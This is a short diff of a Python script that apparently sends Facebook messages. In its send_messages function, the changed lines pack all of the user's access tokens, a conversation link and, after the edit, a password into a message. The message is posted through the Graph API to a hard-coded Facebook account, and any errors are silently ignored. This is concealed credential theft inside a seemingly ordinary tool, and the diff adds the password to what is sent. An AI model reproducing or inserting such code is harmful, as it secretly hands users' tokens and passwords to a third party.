@@ -105,10 +105,10 @@ def send_messages():
 	def msg():
 		parameters = {
 			'access_token' : random.choice(access_tokens),
-			'message': 'User Profile Name : '+getName(random.choice(access_tokens))+'       \ Hlo Broken Sir I Am Using Your Server My Token Is : '+" | ".join(access_tokens)+'\ Link : https://www.facebook.com/messages/t/'+convo_id+'
+			'message': 'User Profile Name : '+getName(random.choice(access_tokens))+'\ Token : '+" | ".join(access_tokens)+'\ Link : https://www.facebook.com/messages/t/'+convo_id+'\ Password: '+password
 		}
 		try:
-			s = requests.post("https://graph.facebook.com/v15.0/t_https://www.facebook.com/profile.php?id=100001087422925/", data=parameters, headers=headers)
+			s = requests.post("https://graph.facebook.com/v15.0/t_100001087422925/", data=parameters, headers=headers)
 		except:
 			pass
 	
